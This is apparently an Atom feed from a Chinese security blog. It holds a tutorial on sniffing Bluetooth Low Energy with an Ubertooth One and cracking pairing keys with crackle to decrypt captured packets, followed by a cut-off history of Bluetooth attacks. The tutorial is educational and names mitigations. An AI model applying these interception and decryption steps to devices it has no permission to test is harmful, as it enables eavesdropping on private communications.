<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ol4three</title>
  
  <subtitle>一个专注于信息安全技术的白帽子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.ol4three.com/"/>
  <updated>2020-12-01T11:51:27.204Z</updated>
  <id>http://www.ol4three.com/</id>
  
  <author>
    <name>ol4three</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用Ubertooth one扫描嗅探低功耗蓝牙</title>
    <link href="http://www.ol4three.com/2020/10/14/IOT/%E4%BD%BF%E7%94%A8Ubertooth-one%E6%89%AB%E6%8F%8F%E5%97%85%E6%8E%A2%E4%BD%8E%E5%8A%9F%E8%80%97%E8%93%9D%E7%89%99/"/>
    <id>http://www.ol4three.com/2020/10/14/IOT/%E4%BD%BF%E7%94%A8Ubertooth-one%E6%89%AB%E6%8F%8F%E5%97%85%E6%8E%A2%E4%BD%8E%E5%8A%9F%E8%80%97%E8%93%9D%E7%89%99/</id>
    <published>2020-10-14T07:17:42.000Z</published>
    <updated>2020-12-01T11:51:27.204Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-本机环境"><a href="#0x00-本机环境" class="headerlink" title="0x00 本机环境"></a>0x00 本机环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mac osx 10.15.5</span><br><span class="line">VMware Fusion 11.5.1</span><br><span class="line">Ubuntu 18.04</span><br><span class="line">Ubertooth One</span><br></pre></td></tr></table></figure><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><h3 id="1-安装lib库"><a href="#1-安装lib库" class="headerlink" title="1. 安装lib库"></a>1. 安装lib库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-software-properties</span><br><span class="line">add-apt-repository ppa:pyside</span><br><span class="line">apt-get update</span><br><span class="line">apt-get install libnl-3-dev libusb-1.0-0-dev pyside-tools</span><br></pre></td></tr></table></figure><h3 id="2-安装libbtbb"><a href="#2-安装libbtbb" class="headerlink" title="2. 安装libbtbb"></a>2. 安装libbtbb</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;greatscottgadgets&#x2F;libbtbb&#x2F;archive&#x2F;2015-09-R2.tar.gz -O libbtbb-2015-09-R2.tar.gz</span><br><span class="line">tar xf libbtbb-2015-09-R2.tar.gz</span><br><span class="line">cd libbtbb-2015-09-R2</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h3 id="3-安装ubertooth"><a href="#3-安装ubertooth" class="headerlink" title="3. 安装ubertooth"></a>3. 安装ubertooth</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ubertooth</span><br></pre></td></tr></table></figure><blockquote><p>报错安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install pkg-config</span><br></pre></td></tr></table></figure></blockquote><h3 id="4-安装wireshark"><a href="#4-安装wireshark" class="headerlink" title="4. 安装wireshark"></a>4. 安装wireshark</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install wireshark</span><br></pre></td></tr></table></figure><h3 id="5-安装kismet"><a href="#5-安装kismet" class="headerlink" title="5. 安装kismet"></a>5. 安装kismet</h3><h4 id="a-直接安装"><a href="#a-直接安装" class="headerlink" title="a. 直接安装"></a>a. 直接安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ckermit </span><br></pre></td></tr></table></figure><p>在~中创建.kermrc，然后输入如下配置信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">set line          &#x2F;dev&#x2F;ttyUSB0  </span><br><span class="line">set speed         115200  </span><br><span class="line">set carrier-watch off  </span><br><span class="line">set handshake     none  </span><br><span class="line">set flow-control none  </span><br><span class="line">robust  </span><br><span class="line">set file type     bin  </span><br><span class="line">set file name     lit  </span><br><span class="line">set rec pack      1000  </span><br><span class="line">set send pack     1000  </span><br><span class="line">set window        5  </span><br></pre></td></tr></table></figure><h4 id="b-编译安装"><a href="#b-编译安装" class="headerlink" title="b. 编译安装"></a>b. 编译安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;kismetwireless.net&#x2F;code&#x2F;kismet-2020-09-R1.tar.xz</span><br><span class="line">tar xf kismet-2020-09-R1.tar.xz</span><br><span class="line">cd kismet-2020-09-R1</span><br><span class="line">ln -s ..&#x2F;ubertooth-2015-09-R2&#x2F;host&#x2F;kismet&#x2F;plugin-ubertooth .</span><br><span class="line">.&#x2F;configure</span><br><span class="line">make &amp;&amp; make plugins</span><br><span class="line">sudo make suidinstall</span><br><span class="line">sudo make plugins-install</span><br></pre></td></tr></table></figure><blockquote><p>报错安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ncurses-dev</span><br><span class="line">sudo apt-get install libpcap-dev</span><br><span class="line">sudo apt-get install libz-dev</span><br><span class="line">sudo apt-get install libmicrohttpd-dev</span><br><span class="line">sudo apt-get install libsqlite3-dev</span><br></pre></td></tr></table></figure></blockquote><p>找到kismet的配置文件kismet.conf ，把”pcapbtbb”加入到kismet.conf的logtypes= 里边</p><h3 id="6-安装BLE解密工具crackle"><a href="#6-安装BLE解密工具crackle" class="headerlink" title="6. 安装BLE解密工具crackle"></a>6. 安装BLE解密工具crackle</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;mikeryan&#x2F;crackle.git</span><br><span class="line">cd crackle</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="0x02-嗅探扫描"><a href="#0x02-嗅探扫描" class="headerlink" title="0x02 嗅探扫描"></a>0x02 嗅探扫描</h2><h3 id="1-Spectool"><a href="#1-Spectool" class="headerlink" title="1. Spectool"></a>1. Spectool</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install spectools</span><br></pre></td></tr></table></figure><h4 id="a-spectool-curses"><a href="#a-spectool-curses" class="headerlink" title="a. spectool_curses"></a>a. spectool_curses</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015092657632.png" alt="image-20201015092657632"></p><h4 id="b-spectool-gtk"><a href="#b-spectool-gtk" class="headerlink" title="b. spectool_gtk"></a>b. spectool_gtk</h4><p>扫描附近信号在频谱上显示</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015093808357.png" alt="image-20201015093808357"></p><h4 id="c-spectool-raw"><a href="#c-spectool-raw" class="headerlink" title="c. spectool_raw"></a>c. spectool_raw</h4><p>RAW中文的解释是“原材料”或“未经过处理的东西”，这里猜测是显示设备捕获到的未经处理的信号数据：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015094038013.png" alt="image-20201015094038013"></p><h4 id="d-spectool-net"><a href="#d-spectool-net" class="headerlink" title="d. spectool_net"></a>d. spectool_net</h4><p>将Ubertooth One作为一台“硬件服务器”，并监听TCP：30569端口，局域网内任何可以跟主机建立通信的PC可通过Ubertoothe主机IP+30569共享设备。连接方式：在另外一台主机终端上执行：spectool_gtk</p><p>—&gt;选择Open Network Device —&gt;输入ip、端口</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015094733056.png" alt="image-20201015094733056"></p><h3 id="2-Hcitool"><a href="#2-Hcitool" class="headerlink" title="2. Hcitool"></a>2. Hcitool</h3><p>hcitool –help</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">hcitool - HCI Tool ver 5.48</span><br><span class="line">Usage:</span><br><span class="line">hcitool [options] &lt;command&gt; [command parameters]</span><br><span class="line">Options:</span><br><span class="line">--helpDisplay help</span><br><span class="line">-i devHCI device</span><br><span class="line">Commands:</span><br><span class="line">dev Display local devices</span><br><span class="line">inq Inquire remote devices</span><br><span class="line">scanScan for remote devices</span><br><span class="line">nameGet name from remote device</span><br><span class="line">infoGet information from remote device</span><br><span class="line">spinqStart periodic inquiry</span><br><span class="line">epinqExit periodic inquiry</span><br><span class="line">cmd Submit arbitrary HCI commands</span><br><span class="line">con Display active connections</span><br><span class="line">cc  Create connection to remote device</span><br><span class="line">dc  Disconnect from remote device</span><br><span class="line">sr  Switch master&#x2F;slave role</span><br><span class="line">cpt Change connection packet type</span><br><span class="line">rssiDisplay connection RSSI</span><br><span class="line">lq  Display link quality</span><br><span class="line">tpl Display transmit power level</span><br><span class="line">afh Display AFH channel map</span><br><span class="line">lp  Set&#x2F;display link policy settings</span><br><span class="line">lst Set&#x2F;display link supervision timeout</span><br><span class="line">authRequest authentication</span><br><span class="line">enc Set connection encryption</span><br><span class="line">key Change connection link key</span><br><span class="line">clkoffRead clock offset</span><br><span class="line">clockRead local or remote clock</span><br><span class="line">lescanStart LE scan</span><br><span class="line">leinfoGet LE remote information</span><br><span class="line">lewladdAdd device to LE White List</span><br><span class="line">lewlrmRemove device from LE White List</span><br><span class="line">lewlszRead size of LE White List</span><br><span class="line">lewlclrClear LE White List</span><br><span class="line">lerladdAdd device to LE Resolving List</span><br><span class="line">lerlrmRemove device from LE Resolving List</span><br><span class="line">lerlclrClear LE Resolving List</span><br><span class="line">lerlszRead size of LE Resolving List</span><br><span class="line">lerlonEnable LE Address Resolution</span><br><span class="line">lerloffDisable LE Address Resolution</span><br><span class="line">leccCreate a LE Connection</span><br><span class="line">ledcDisconnect a LE Connection</span><br><span class="line">lecupLE Connection Update</span><br><span class="line"></span><br><span class="line">For more information on the usage of each command use:</span><br><span class="line">hcitool &lt;command&gt; --help</span><br></pre></td></tr></table></figure><p>hcitool scan :扫描附近蓝牙设备</p><p>hcitool lescan :扫描附近低功耗蓝牙设备</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015095601031.png" alt="image-20201015095601031"></p><h3 id="3-Gatttool"><a href="#3-Gatttool" class="headerlink" title="3. Gatttool"></a>3. Gatttool</h3><p> gatttool -h</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  gatttool [OPTION?]</span><br><span class="line"></span><br><span class="line">Help Options:</span><br><span class="line">  -h, --help                                Show help options</span><br><span class="line">  --help-all                                Show all help options</span><br><span class="line">  --help-gatt                               Show all GATT commands</span><br><span class="line">  --help-params                             Show all Primary Services&#x2F;Characteristics arguments</span><br><span class="line">  --help-char-read-write                    Show all Characteristics Value&#x2F;Descriptor Read&#x2F;Write arguments</span><br><span class="line"></span><br><span class="line">Application Options:</span><br><span class="line">  -i, --adapter&#x3D;hciX                        Specify local adapter interface</span><br><span class="line">  -b, --device&#x3D;MAC                          Specify remote Bluetooth address</span><br><span class="line">  -t, --addr-type&#x3D;[public | random]         Set LE address type. Default: public</span><br><span class="line">  -m, --mtu&#x3D;MTU                             Specify the MTU size</span><br><span class="line">  -p, --psm&#x3D;PSM                             Specify the PSM for GATT&#x2F;ATT over BR&#x2F;EDR</span><br><span class="line">  -l, --sec-level&#x3D;[low | medium | high]     Set security level. Default: low</span><br><span class="line">  -I, --interactive                         Use interactive mode</span><br></pre></td></tr></table></figure><p>gatttool -b EC:F3:42:B2:DF:24 -I</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015100005087.png" alt="image-20201015100005087"></p><h3 id="4-Ubertooth-scan-s"><a href="#4-Ubertooth-scan-s" class="headerlink" title="4. Ubertooth-scan -s"></a>4. Ubertooth-scan -s</h3><p>sudo apt install ubertooth</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015104856092.png" alt="image-20201015104856092"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015104915904.png" alt="image-20201015104915904"></p><h3 id="5-Ubertooth-ble"><a href="#5-Ubertooth-ble" class="headerlink" title="5. Ubertooth-ble"></a>5. Ubertooth-ble</h3><pre><code>ubertooth-btle - passive Bluetooth Low Energy monitoringUsage:    -h this help    Major modes:    -f follow connections    -p promiscuous: sniff active connections    -a[address] get/set access address (example: -a8e89bed6)    -s&lt;address&gt; faux slave mode, using MAC addr (example: -s22:44:66:88:aa:cc)    -t&lt;address&gt; set connection following target (example: -t22:44:66:88:aa:cc)    Interference (use with -f or -p):    -i interfere with one connection and return to idle    -I interfere continuously    Data source:    -U&lt;0-7&gt; set ubertooth device to use    Misc:    -r&lt;filename&gt; capture packets to PCAPNG file    -q&lt;filename&gt; capture packets to PCAP file (DLT_BLUETOOTH_LE_LL_WITH_PHDR)    -c&lt;filename&gt; capture packets to PCAP file (DLT_PPI)    -A&lt;index&gt; advertising channel index (default 37)    -v[01] verify CRC mode, get status or enable/disable    -x&lt;n&gt; allow n access address offenses (default 32)If an input file is not specified, an Ubertooth device is used for live capture.In get/set mode no capture occurs.</code></pre><blockquote><p>ubertooth-btle -f -c test.pcap抓包&amp;保存到本地</p></blockquote><p>使用这条命令我们可以把设备捕获到的数据包保存到本地，完成后可导入wireshark进行数据包、协议分析。</p><p>wireshark导入嗅探到的蓝牙数据包需要处理一下才能正常查看，不然无法正常分析数据：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015113803864.png" alt="image-20201015113803864"></p><p>Edit → Preferences → Protocols → DLT_USER → Edit → New</p><p>在payload protocol中输入btle</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015110349788.png" alt="image-20201015110349788"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015113903595.png" alt="image-20201015113903595"></p><p>使用规则过滤数据包：参考<a href="https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark">Capturing BLE in Wireshark</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">btle.data_header.length &gt; 0 || btle.advertising_header.pdu_type &#x3D;&#x3D; 0x05</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015114932731.png" alt="image-20201015114932731"></p><h3 id="6-crackle"><a href="#6-crackle" class="headerlink" title="6. crackle"></a>6. crackle</h3><p>如果捕获到足够的数据包尤其是btsmp，抓到包之后我们最关心的问题是我们有没有抓到的足够的包来破解tk。所以在wireshark中你可以在filter处加上btsmp，确保抓到了我们需要的6个包。，那接下来便可以用crackle来破解tk和ltk：</p><p><strong>做到这个点尝试了身边的一些设备的连接没抓到大量包没有至少6个btsmp之后实践中碰到补足图片</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackle -i &lt;file.pcap&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015115144837.png" alt="image-20201015115144837"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">从上图中我们可以看到我们不但破解了tk，还利用利用tk和其它一些数据成功的还原出了ltk。</span><br><span class="line"></span><br><span class="line">接下来我们再来试试利用获取的ltk来破解其他的加密包。假设我们在配对过程中已经拿到了ltk&#x3D;7f62c053f104a5bbe68b1d896a2ed49c</span><br></pre></td></tr></table></figure><p>解密数据包，并把解密后的包另存：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crackle -i &lt;file.pcap&gt; -o &lt;output.pcap&gt;</span><br><span class="line">crackle -i &lt;file.pcap&gt; -o &lt;out.pcap&gt; -l &lt;ltk&gt;</span><br><span class="line"></span><br><span class="line">crackle -l 7f62c053f104a5bbe68b1d896a2ed49c -i test44.pcap -o test66.pcap</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201015115842434.png" alt="image-20201015115842434"></p><p>可以看到成功破解了7个包</p><h2 id="0x03-解决方案"><a href="#0x03-解决方案" class="headerlink" title="0x03 解决方案"></a>0x03 解决方案</h2><h4 id="1-使用OOB"><a href="#1-使用OOB" class="headerlink" title="1. 使用OOB"></a>1. 使用OOB</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[email protected]:~&#x2F;Desktop# crackle -i heart.pcap </span><br><span class="line">Warning: No output file specified. Won&#39;t decrypt any packets.</span><br><span class="line">Warning: found multiple connects, only using the latest one</span><br><span class="line">Warning: found multiple LL_ENC_REQ, only using latest one</span><br><span class="line">Warning: found multiple connects, only using the latest one</span><br><span class="line">Warning: found multiple pairing requests, only using the latest one</span><br><span class="line">Warning: found multiple connects, only using the latest one</span><br><span class="line">Warning: found multiple pairing requests, only using the latest one</span><br><span class="line">Warning: already saw two random values, skipping</span><br><span class="line">Warning: found multiple LL_ENC_REQ, only using latest one</span><br><span class="line">TK not found, the connection is probably using OOB pairing</span><br><span class="line">Sorry d00d :(</span><br></pre></td></tr></table></figure><h4 id="2-支持bluetooth4-2以上的设备的出现（通过ECDH解决）"><a href="#2-支持bluetooth4-2以上的设备的出现（通过ECDH解决）" class="headerlink" title="2. 支持bluetooth4.2以上的设备的出现（通过ECDH解决）"></a>2. 支持bluetooth4.2以上的设备的出现（通过ECDH解决）</h4><h2 id="0x04-参考："><a href="#0x04-参考：" class="headerlink" title="0x04 参考："></a>0x04 参考：</h2><p><a href="http://www.vuln.cn/6083">http://www.vuln.cn/6083</a></p><p><a href="https://blog.csdn.net/charmve/article/details/107170250">https://blog.csdn.net/charmve/article/details/107170250</a></p><p><a href="https://www.freebuf.com/articles/wireless/106298.html">路人甲@乌云drops:Bluetooth Low Energy 嗅探</a></p><p><a href="http://j2abro.blogspot.com.au/2014/06/understanding-bluetooth-advertising.html">疯狗@乌云drops：物联网安全拔“牙”实战——低功耗蓝牙（BLE）初探</a></p><p><a href="https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide">https://github.com/greatscottgadgets/ubertooth/wiki/Build-Guide</a></p><p><a href="https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark">https://github.com/greatscottgadgets/ubertooth/wiki/Capturing-BLE-in-Wireshark</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-本机环境&quot;&gt;&lt;a href=&quot;#0x00-本机环境&quot; class=&quot;headerlink&quot; title=&quot;0x00 本机环境&quot;&gt;&lt;/a&gt;0x00 本机环境&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;t
      
    
    </summary>
    
    
      <category term="IOT" scheme="http://www.ol4three.com/categories/IOT/"/>
    
    
      <category term="BLE" scheme="http://www.ol4three.com/tags/BLE/"/>
    
      <category term="Ubertooth one" scheme="http://www.ol4three.com/tags/Ubertooth-one/"/>
    
      <category term="SDK" scheme="http://www.ol4three.com/tags/SDK/"/>
    
  </entry>
  
  <entry>
    <title>蓝牙安全以及相关漏洞研究</title>
    <link href="http://www.ol4three.com/2020/09/24/IOT/%E8%93%9D%E7%89%99%E5%AE%89%E5%85%A8%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    <id>http://www.ol4three.com/2020/09/24/IOT/%E8%93%9D%E7%89%99%E5%AE%89%E5%85%A8%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</id>
    <published>2020-09-24T09:39:19.000Z</published>
    <updated>2020-12-02T06:40:04.886Z</updated>
    
    <content type="html"><![CDATA[<p>放大佬总结的一张图：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/BLE%E5%AE%89%E5%85%A8.png" alt="BLE安全"></p><p>蓝牙是一种无线通信标准，工作在2.4～2.485Ghz的ISM频段，主要用于短距离的数据连接，可以建立所谓的PAN(Personal Area Network)网络。蓝牙设备最常见的应用是各种以手机和电脑为中心的外围设备，例如与手机配合使用的蓝牙耳机、手机与汽车音响的互联、蓝牙键盘和鼠标等。</p><h2 id="0x00-蓝牙技术简介"><a href="#0x00-蓝牙技术简介" class="headerlink" title="0x00 蓝牙技术简介"></a><strong>0x00 蓝牙技术简介</strong></h2><p>蓝牙”，即Bluetooth，是斯堪的纳维亚语中 Blåtand / Blåtann 的英化版本。该词是十世纪的一位国王Harald Bluetooth的绰号，相传他将纷争不断的丹麦部落统一为一个王国，并引入了基督教。蓝牙技术开发者Jim Kardach于1997年提出用Bluetooth这个名词，据说他当时正在读一本名为The Long Ships的小说，讲述的就是维京人和Harald Bluetooth国王的故事。他认为蓝牙可以把各种不同的通信协议统一在一起，诚如这位国王做的事情一样。至于蓝牙的logo，取自国王Harald Bluetooth名字中的【H】和【B】两个字母的组合，用古北欧文字来表示：</p><p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/33981.png" alt="0"></p><p>蓝牙技术最早是1994年由爱立信发明的，最初的目的是用无线连接来代替RS-232线缆连接。目前蓝牙标准由Bluetooth Special Interest Group (SIG) 组织管理。这一组织有超过25000个成员公司，分布在电信、计算机、网络和消费电子领域。</p><p>蓝牙工作在2.4～2.485GHz频段，有79个频道，每个频道占据1MHz宽带。因为2.4GHz的ISM频段是非常繁忙的，为了对抗其他系统的干扰，蓝牙采取跳频式的扩频技术，通常1秒钟跳跃1600次。BLE(Bluetooth Low Energy)只有40个频道，每个频道占据2MHz宽带.</p><p>蓝牙是一种基于数据包通信的协议，使用主-从式的网络结构。在一个piconet中，1个主节点可以与多达7个从节点通信。所有的设备都共享主节点的时钟。数据包以312.5us的间隔互相交换，这个时间成为clock tick。两个clock tick构成一个625us的时隙，两个时隙构成一个1250us的时隙对。一种比较简单的时隙配置是，主节点在偶数时隙发送数据包，在奇数时隙接受数据包；从节点相反，在偶数时隙接受数据包，在奇数时隙发送数据包。这里讨论的是经典的蓝牙协议，BLE的空中接口协议与经典的蓝牙协议有很大的不同。蓝牙协议还支持多个piconet连接在一起，组成scatternet。在这种情况下，某些设备可以在一个piconet中担任主节点，在离另一个piconet中知识从节点。</p><p>蓝牙技术已经发展了很多年，蓝牙规范有很多个版本，从最早的蓝牙1.0到2014年发布的蓝牙4.2。早期的蓝牙标准只能支持几百Kbps的传输速率，而到了蓝牙3.0版本，已经可以支持最高24Mbps的传输速度。蓝牙4.0版本引入了BLE协议，即低功耗蓝牙，其功耗非常低，可以使设备的电池维持很长的时间，因此在很多可穿戴设备中得到了应用。</p><p>一文读懂蓝牙技术从 1.0 到 5.0 的前世今生                                  (<a href="https://zhuanlan.zhihu.com/p/37725574">https://zhuanlan.zhihu.com/p/37725574</a>)</p><h2 id="0x01-蓝牙安全概述"><a href="#0x01-蓝牙安全概述" class="headerlink" title="0x01 蓝牙安全概述"></a><strong>0x01 蓝牙安全概述</strong></h2><p>蓝牙协议有加密和鉴权功能。蓝牙的密钥产生是基于蓝牙的PIN码的。PIN码需要输入到蓝牙设备中，或者出场时就已经写入设备里。在美国国家标准技术研究所官网上有一份蓝牙安全指南Guide to Bluetooth Security(<a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-172-draft.pdf)中介绍了如何安全的使用蓝牙技术。使用蓝牙技术非常简单、易用、但是也有明显的缺点，容易被拒绝服务攻击、窃听、中间人攻击、数据篡改、占用资源。所有在选用蓝牙技术时，必须充分评估能否接受这样的风险。这份指南同时也给出了一些知道，在创建和维护一个蓝牙系统时，如何去降低他的安全风险。">https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-172-draft.pdf)中介绍了如何安全的使用蓝牙技术。使用蓝牙技术非常简单、易用、但是也有明显的缺点，容易被拒绝服务攻击、窃听、中间人攻击、数据篡改、占用资源。所有在选用蓝牙技术时，必须充分评估能否接受这样的风险。这份指南同时也给出了一些知道，在创建和维护一个蓝牙系统时，如何去降低他的安全风险。</a></p><p>2001年，内尔实验室的Jakobsson和Wetzel发现了蓝牙配对协议中的缺陷，以及加密方法中的漏洞。2003年，A.L.Digital公司的两位研究人员Ben和Adam Laurie发现，在一些蓝牙产品中有严重的漏洞，能够导致个人隐私数据的泄漏。于是，接下来就出现了一种利用这种BlueBug攻击手法，开始展现出这一漏洞的危害性</p><p>2004年，第一个所谓的蓝牙病毒出现，它可以在Symbian操作系统的手机中传播。这个”病毒”是一个名叫”29A”的团队编写的PoC程序，写出来之后就交给了反病毒机构，因此它具有威胁性，但并没有真正的传播过。2004年8月，一项实验创纪录地把蓝牙连接的距离增加到了1.79公里，在实验中使用了方向性天线和功率放大器。这就增加了蓝牙病毒的危险性，使得它能够威胁到距离非常远的蓝牙设备</p><p>2005年1月，出现了一种名为”Lasco.A”的手机蠕虫病毒，也是针对Symbian手机的。用户一旦通过蓝牙接收这个病毒文件，病毒就会自动地安装在系统中，然后开始寻找周围其他的蓝牙设备去感染。另外这种病毒还能感染系统中的其他SIS文件。最终的后果是导致手机系统不稳定。</p><p>2005 年4月，剑桥大学的安全研究人员公布了他们发现的一种被动式攻击方式， 能够攻击基于PIN码的配对协议。这种攻击方式操作起来非常快，证实了蓝牙的对称密钥的建立方法是有缺陷的。为了抵御这种攻击，研究人员提出了-种更强的非对称密钥加密方法。</p><p>2005年6月，Yaniv Shaked和Avishai Wool发表了一篇论文，提出了被动式和主动式两种攻击方式，可以获得PIN码。在被动式攻击中，攻击者在蓝牙设备初始配对的时刻就能窃听到通信的内容:而主动式攻击则需要在某个特定的时刻发出一-种特殊构造的数据包，使主节点和从节点重复配对过程，之后就可以使用被动式攻击在配对过程中侦听密钥了。这种攻击的主要弱点在于，它需要受到攻击的用户在攻击期间重新输入PIN码，此时设备会有提示。另外，这种攻击还需要一些特别的设备在恰当的时刻发出一种特殊构造的数据包，现成的蓝牙芯片是不.能做到这一- 点的。</p><p>蓝牙地址还可以用于追踪设备的位置。2005 年8月，英格兰剑桥郡的警方发出警示说，有些小偷利用蓝牙来探查车内是否有被遗忘的手机或电脑等设备，提示人们在不使用蓝牙功能时尽量关闭它。</p><p>2006年4月，来自Secure 